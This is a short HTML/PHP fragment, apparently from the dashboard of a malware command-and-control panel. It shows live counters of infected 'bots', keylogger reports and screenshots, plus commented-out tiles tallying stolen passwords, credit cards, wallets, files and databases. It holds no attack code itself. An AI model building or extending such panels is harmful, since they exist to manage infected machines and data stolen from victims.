	<div class="row">
               
           
                <div class="col-sm-4"><div class="well" style="color: #fff; font-size: 20pt"><span class="ion-android-contacts" style="padding-right:3px;padding-left:3px;margin-left:3px;margin-right:5px;"></span>Total Bots : <?php echo $count_bot; ?></div></div>
                <div class="col-sm-4"><div class="well" style="color: #fff; font-size: 20pt"><span class="ion-clipboard" style="padding-right:3px;padding-left:3px;margin-left:3px;margin-right:5px;"></span>Keylogger Reports : <?php echo $count_keylogger; ?> </div></div>
                <div class="col-sm-4"><div class="well" style="color: #fff; font-size: 20pt"><span class="ion-monitor" style="padding-right:3px;padding-left:3px;margin-left:3px;margin-right:5px;"></span>Screenshot : <?php echo $count_Screenshot; ?></div></div>

                 
                <!-- <div class="col-sm-4"><div class="well" style="color: #fff; font-size: 20pt"><span class="ion-eye-disabled" style="padding-right:3px;padding-left:3px;margin-left:3px;margin-right:5px;"></span>Passwords : 232</div></div>
                <div class="col-sm-4"><div class="well" style="color: #fff; font-size: 20pt"><span class="ion-card" style="padding-right:3px;padding-left:3px;margin-left:3px;margin-right:5px;"></span>Credit Cards : 3</div></div>
                <div class="col-sm-4"><div class="well" style="color: #fff; font-size: 20pt"><span class="ion-cash" style="padding-right:3px;padding-left:3px;margin-left:3px;margin-right:5px;"></span>Wallets : 0</div></div>
                <div class="col-sm-4"><div class="well" style="color: #fff; font-size: 20pt"><span class="ion-ios-folder" style="padding-right:3px;padding-left:3px;margin-left:3px;margin-right:5px;"></span>Files : 3546</div></div>
                <div class="col-sm-4"><div class="well" style="color: #fff; font-size: 20pt"><span class="ion-ios-albums" style="padding-right:3px;padding-left:3px;margin-left:3px;margin-right:5px;"></span>DataBases : 78</div></div>
                <div class="col-sm-4"><div class="well" style="color: #fff; font-size: 20pt"><span class="ion-monitor" style="padding-right:3px;padding-left:3px;margin-left:3px;margin-right:5px;"></span>Total Bots : 232</div></div> -->
</div>	